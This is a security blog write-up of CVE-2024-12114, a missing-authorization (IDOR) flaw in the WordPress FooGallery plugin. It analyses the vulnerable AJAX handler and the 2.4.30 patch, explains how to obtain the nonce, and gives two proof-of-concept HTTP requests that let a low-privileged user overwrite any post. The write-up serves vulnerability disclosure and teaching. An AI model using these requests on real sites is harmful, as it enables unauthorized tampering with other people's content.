---
title: CVE-2024-12114 Analysis & POC
description: Security Vulnerability in WordPress FooGallery Plugin.
date: 2025-12-30 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, idor]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
    auto: false
---

<!--more-->

## CVE & Basic Info

The **FooGallery – Responsive Photo Gallery, Image Viewer, Justified, Masonry & Carousel** plugin for **WordPress** contains an **Insecure Direct Object Reference** vulnerability in **all versions up to and including 2.4.29** via the AJAX action **`foogallery_attachment_modal_save`**, due to **missing authorization checks** on a user-controlled key (**`img_id`**).
This allows an **authenticated attacker**, with **granted access or higher**, to **update the content of any post or page**.
The actual impact only occurs when the **Gallery Creator role setting** is set **lower than “Editor”**.

* **CVE ID**: [CVE-2024-12114](https://www.cve.org/CVERecord?id=CVE-2024-12114)
* **Vulnerability Type**: Insecure Direct Object References (IDOR)
* **Affected Versions**: <= 2.4.29
* **Patched Versions**: 2.4.30
* **CVSS severity**: Low (4.3)
* **Required Privilege**: N/A
* **Product**: [WordPress FooGallery Plugin](https://wordpress.org/plugins/foogallery/)

## Requirements

* **Local WordPress & Debugging**

  * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
  * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **FooGallery**:

  * `2.4.29` – **vulnerable**
  * `2.4.30` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) or any diff tool.

> [!INFO]
> According to the CVE description, the actual impact only occurs when the **Gallery Creator role setting** is set **lower than “Editor”**.
> You can configure it here:
> ![Role](role.png "Gallery Creator role")
> At that point, users with this role will be able to use the **Add**/**Edit** Gallery functionality:
> ![Create/Add](create.png "Create/Add")

## Analysis

The plugin registers an AJAX handler **for logged-in users**:

```php {title="class-gallery-attachment-modal.php v2.4.29" data-open=true hl_lines=[]}
add_action( 'wp_ajax_foogallery_attachment_modal_save', array( $this, 'ajax_save_modal' ) );
```

`wp_ajax_` is a hook for authenticated users (Subscriber+). When a request is sent to `/wp-admin/admin-ajax.php` with the parameter `action=foogallery_attachment_modal_save`, the callback `ajax_save_modal` is executed:

```php {title="class-gallery-attachment-modal.php v2.4.29" data-open=true hl_lines=[9,16]}
public function ajax_save_modal() {
    $foogallery = ( isset( $_POST['foogallery'] ) ? $_POST['foogallery'] : array() );

    if ( !is_array( $foogallery ) || empty( $foogallery ) ) {
        return;
    }

    // Check for nonce security      
    if ( ! wp_verify_nonce( $_POST['nonce'], 'foogallery-modal-nonce' ) ) {
        die ( 'Busted!');
    }

    $img_id = intval( sanitize_text_field( $_POST['img_id'] ) );

    if ( $img_id > 0 ) {
        do_action( 'foogallery_attachment_save_data', $img_id, $foogallery );
    }
    
    wp_die();
}
```

The function retrieves `foogallery` from the request, checks whether it is a valid non-empty array, then verifies the nonce to ensure the request is valid:

```php
if ( ! wp_verify_nonce( $_POST['nonce'], 'foogallery-modal-nonce' ) ) {
    die ( 'Busted!');
}
```

The function `wp_verify_nonce()` verifies whether the submitted `nonce` is valid (generated by the `foogallery-modal-nonce` action).

If valid and `img_id > 0`, `do_action('foogallery_attachment_save_data', ...)` is executed with the provided `img_id` and `foogallery` data.

Previously, the plugin registered a series of callbacks for the `foogallery_attachment_save_data` action:

![Add action](add_action.png "Registered callbacks for action foogallery_attachment_save_data")

```php {title="class-gallery-attachment-modal.php v2.4.29" data-open=true hl_lines=[]}
public function foogallery_attachment_save_data_main( $img_id, $data ) {

    if ( is_array( $data ) && !empty( $data ) ) {

        $foogallery_post = array(
            'ID' => $img_id
        );

        if ( array_key_exists( 'title', $data ) ) {
            $foogallery_post['post_title'] = $data['title'];
        }

        if ( array_key_exists( 'caption', $data ) ) {
            $foogallery_post['post_excerpt'] = $data['caption'];
        }

        if ( array_key_exists( 'description', $data ) ) {
            $foogallery_post['post_content'] = $data['description'];
        }

        // Update post meta values
        if ( array_key_exists( 'alt-text', $data ) ) {
            update_post_meta( $img_id, '_wp_attachment_image_alt', $data['alt-text'] );
        }

        if ( array_key_exists( 'custom-url', $data ) ) {
            update_post_meta( $img_id, '_foogallery_custom_url', $data['custom-url'] );
        }

        if ( array_key_exists( 'custom-target', $data ) ) {
            update_post_meta( $img_id, '_foogallery_custom_target', $data['custom-target'] );
        }

        if ( array_key_exists( 'custom-class', $data ) ) {
            update_post_meta( $img_id, '_foogallery_custom_class', $data['custom-class'] );
        }

        if ( is_array( $foogallery_post ) && count( $foogallery_post ) > 1 ) {
            // Update the post into the database
            wp_update_post( $foogallery_post );
        }
    }
}
```

```php {title="class-gallery-attachment-modal.php v2.4.29" data-open=true hl_lines=[]}
public function foogallery_attachment_save_data_taxonomies( $img_id, $data ) {
    if ( is_array( $data ) && !empty( $data ) ) {

        if ( !$this->attachments_have_taxonomies() ) {
            return;
        }

        if ( array_key_exists( 'taxonomies', $data ) ) {
            foreach ( $data['taxonomies'] as $taxonomy => $taxonomy_value ) {
                $terms = explode( ',', $taxonomy_value );
                if ( is_array( $terms ) ) {
                    $terms = array_map( 'intval', $terms );
                    wp_set_object_terms( $img_id, $terms, $taxonomy, false );
                }
            }
        }
    }
}
```

```php {title="class-gallery-attachment-modal.php v2.4.29" data-open=true hl_lines=[]}
public function foogallery_attachment_save_data_thumbnails( $img_id, $data ) {
    if ( is_array( $data ) && !empty( $data ) ) {

        if ( array_key_exists( 'crop_pos', $data ) ) {
            update_post_meta( $img_id, 'foogallery_crop_pos', $data['crop_pos'] );
        }

        if ( array_key_exists( 'override-thumbnail-id', $data ) ) {
            update_post_meta( $img_id, 'foogallery_override_thumbnail', $data['override-thumbnail-id'] );
        }
    }
}
```

```php {title="class-gallery-attachment-modal.php v2.4.29" data-open=true hl_lines=[]}
public function foogallery_attachment_save_data_advanced($img_id, $data ) {
    if ( is_array( $data ) && !empty( $data ) ) {
        if ( array_key_exists( 'data-width', $data ) ) {
            update_post_meta( $img_id, '_data-width', $data['data-width'] );
        }

        if ( array_key_exists( 'data-height', $data ) ) {
            update_post_meta( $img_id, '_data-height', $data['data-height'] );
        }

        if ( array_key_exists( 'panning', $data ) ) {
            update_post_meta( $img_id, '_foobox_panning', $data['panning'] );
        }

        if ( array_key_exists( 'override_type', $data ) ) {
            update_post_meta( $img_id, '_foogallery_override_type', $data['override_type'] );
        }
    }
}
```

These callbacks perform a series of updates on the gallery corresponding to `img_id`, with data fully controlled by the attacker.

The IDOR vulnerability occurs because there is no restriction on the gallery corresponding to `img_id`, allowing an attacker to arbitrarily modify galleries they do not own.

The patch in `v2.4.30` added the following restriction:

```php
if ( current_user_can('edit_post', $img_id ) ) {
    do_action( 'foogallery_attachment_save_data', $img_id, $foogallery );
}
```

![Patch](patch.png "Patch")

Only users with the `edit_post` capability for the given `$img_id` are allowed to trigger the `foogallery_attachment_save_data` action to modify it.

---

A prerequisite is obtaining the nonce value corresponding to the `foogallery-modal-nonce` action.

![Create nonce](create_nonce.png "Generating nonce with action foogallery-modal-nonce")

The nonce is generated in the `build_modal_data()` function via `wp_create_nonce( 'foogallery-modal-nonce' )` and only if two conditions are met:

* `$data` is an array
* `img_id` and `gallery_id` are not `null`

The `build_modal_data` function returns an array that includes the `nonce` value.

![Embed nonce](embed_nonce.png "Nonce value embedded into HTML")

This value is used by the `ajax_open_modal` function, where the `nonce` is embedded into the HTML form with ID `foogallery_attachment_modal_save_form`.

Before that, `ajax_open_modal` validates the nonce corresponding to the `foogallery_attachment_modal_open` action:

```php
if ( ! wp_verify_nonce( $_POST['nonce'], 'foogallery_attachment_modal_open' ) ) {
    die ( 'Busted!');
}
```

![Create nonce](create_nonce1.png "Generate nonce with action foogallery_attachment_modal_open")

By reviewing the function logic, we see that the nonce is embedded into the HTML of the **edit gallery** page.

Use the **edit gallery** functionality → intercept the request in BurpSuite → filter requests with the keyword `foogallery-image-edit-modal`

![Data nonce](data_nonce.png "Nonce value during filtering")

We can extract the nonce value from this request.

## Flow

{{< mermaid >}}
flowchart TD
A["Authenticated User (Subscriber+)"]
--> B["Request admin-ajax.php?action=foogallery_attachment_modal_open"]

B --> C["Verify nonce: foogallery_attachment_modal_open"]

C --> D["Return HTML modal + embedded nonce (foogallery-modal-nonce)"]

D --> E["User extracts nonce from response"]

E --> F["Send request: action=foogallery_attachment_modal_save"]

F --> G["Verify nonce: foogallery-modal-nonce"]

G --> H["Extract img_id from request"]

H --> I["No capability / ownership check (edit_post)"]

I --> J["do_action(foogallery_attachment_save_data, img_id, data)"]

J --> K["Update post / attachment data"]

K --> L["Unauthorized modification of arbitrary gallery/post (IDOR)"]

{{< /mermaid >}}

## Proof of Concept (PoC)

1. Perform an edit gallery action with a user that has the `Gallery Creator` role
2. Search for the keyword `foogallery-image-edit-modal` and extract the nonce from the response
3. Send a request to retrieve the nonce for the `foogallery_attachment_modal_save_form`

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Cookie: valid_cookie

action=foogallery_attachment_modal_open&nonce=9ad3ed3e9b&img_id=1&gallery_id=1
```

![Get nonce](get_nonce.png "Get nonce from response")

4. Send a request to modify data of any gallery

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Cookie: valid_cookie

action=foogallery_attachment_modal_save&nonce=11bfc5f814&foogallery[]=any_data&img_id=1
```

---

Use UI to perform:
1. Truy cập `http://localhost/wp-admin/post.php?post=post_id&action=edit#`

2. Edit and save

![Edit](edit.png "Edit and save")

## Conclusion

The vulnerability occurs due to **missing authorization checks** on `img_id`.
Although a nonce check exists, the plugin still allows authenticated users to modify **galleries they do not own**, resulting in an **IDOR** vulnerability.
Version 2.4.30 fixes this by checking `current_user_can( 'edit_post', $img_id )`.

## Key Takeaways

* Nonces **do not replace** authorization controls
* Always check permissions at the **object level**
* Never trust client-side data, even with a nonce
* IDOR often appears in AJAX handlers missing `current_user_can()`

## References

[IDOR](https://book.hacktricks.wiki/en/pentesting-web/idor.html)

[WordPress FooGallery Plugin <= 2.4.29 is vulnerable to Insecure Direct Object References (IDOR)](https://patchstack.com/database/wordpress/plugin/foogallery/vulnerability/wordpress-foogallery-plugin-2-4-29-insecure-direct-object-reference-to-authenticated-custom-arbitrary-post-page-updates-vulnerability)
